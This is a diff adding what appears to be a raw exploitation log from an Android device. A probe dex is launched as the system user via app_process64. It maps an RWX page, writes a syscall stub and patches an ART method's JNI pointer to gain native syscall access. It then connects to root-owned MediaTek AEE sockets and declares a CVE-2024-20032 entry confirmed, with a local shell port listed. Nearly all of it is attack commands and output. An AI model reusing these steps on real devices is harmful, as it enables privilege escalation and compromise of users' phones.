@@ -1,0 +1,68 @@
+command=CLASSPATH=/data/data/com.android.settings/cache/aee_socket_probe.dex app_process64 /system/bin AeeSocketProbe --send-req
+probe=aee-socket
+dex_md5=7b6f0404fdc467bc9b9f5f93a125477d
+dex_sha256=c3783603d93840b98d4a75b91a230e2e167501a8c1fc2b4362fa6f344c10838e
+remote_dex=/data/data/com.android.settings/cache/aee_socket_probe.dex
+shell_port=127.0.0.1:48888
+exit_status=0
+
+uid=1000(system) gid=1000(system) groups=1000(system),3003(inet) context=u:r:system_app:s0
+u:r:system_app:s0
+7b6f0404fdc467bc9b9f5f93a125477d  /data/data/com.android.settings/cache/aee_socket_probe.dex
+[AeeSocketProbe] start
+[AeeSocketProbe] uid=1000 pid=21330
+[+] Scratch buffer at 0x7a0b17c000
+[*] Trying anonymous PROT_RWX mmap...
+[+] Anonymous RWX page at 0x7a0b0f9000
+[+] Wrote syscall stub: JNI@+0x00 (36B), call stub JNI@+0x80 (40B); entry_point left untouched
+[*] ArtMethod for nativeSyscall at 0x7a0426a9f0
+    access_flags = 0x10000108 [NATIVE]
+    data (JNI ptr) = 0x774b21a2c0
+    entry_point    = 0x103800080c53c278
+[*] Patching data_ (JNI) → 0x7a0b0f9000
+    data_       = 0x7a0b0f9000 ✓
+    entry_point = 0x103800080c53c278 (unchanged)
+[+] ArtMethod patched
+[+] Syscall infrastructure ready
+
+[phase1] attempting LocalSocket connections to AEE sockets
+[result] CONNECT_FAIL @android:aee_aedv errno=111 (ECONNREFUSED)
+[result] CONNECT_FAIL @android:aee_aedv32 errno=111 (ECONNREFUSED)
+[conn] connected to @android:aee_aed peer_uid=0
+[conn] sent 4-byte zero request to @android:aee_aed
+[conn] no response in 500ms
+[result] CONNECT_OK  @android:aee_aed ret=0
+[conn] connected to @android:aee_aed32 peer_uid=0
+[conn] sent 4-byte zero request to @android:aee_aed32
+[conn] no response in 500ms
+[result] CONNECT_OK  @android:aee_aed32 ret=0
+[conn] connected to @com.mtk.aee.aed peer_uid=0
+[conn] sent 4-byte zero request to @com.mtk.aee.aed
+[conn] no response in 500ms
+[result] CONNECT_OK  @com.mtk.aee.aed ret=0
+[conn] connected to @com.mtk.aee.aed_64 peer_uid=0
+[conn] sent 4-byte zero request to @com.mtk.aee.aed_64
+[conn] no response in 500ms
+[result] CONNECT_OK  @com.mtk.aee.aed_64 ret=0
+[result] CONNECT_FAIL @com.mtk.aee.vaed errno=13 (EACCES)
+[result] CONNECT_FAIL @com.mtk.aee.vaed_64 errno=13 (EACCES)
+[conn] connected to @aee:rttd peer_uid=0
+[conn] sent 4-byte zero request to @aee:rttd
+[conn] no response in 500ms
+[result] CONNECT_OK  @aee:rttd ret=0
+[conn] connected to @aee:rttd_64 peer_uid=0
+[conn] sent 4-byte zero request to @aee:rttd_64
+[conn] no response in 500ms
+[result] CONNECT_OK  @aee:rttd_64 ret=0
+[result] CONNECT_FAIL @aee:vrttd errno=13 (EACCES)
+[result] CONNECT_FAIL @aee:vrttd_64 errno=13 (EACCES)
+[summary] connected=6 / 12 sockets
+[result] AEE_SOCKET_ACCESS=OK — CVE-2024-20032 entry CONFIRMED
+[phase2] probing /dev/aed0 and /dev/aed1 directly
+[dev] open(/dev/aed0) → errno=13 (EACCES)
+[dev] open(/dev/aed1) → errno=13 (EACCES)
+[dev] open(/proc/aed) → errno=13 (EACCES)
+[phase3] checking AEE HIDL service via hwbinder
+[hidl] no aee service in ServiceManager list
+[result] AEE_HIDL_SCAN=done
+[AeeSocketProbe] done
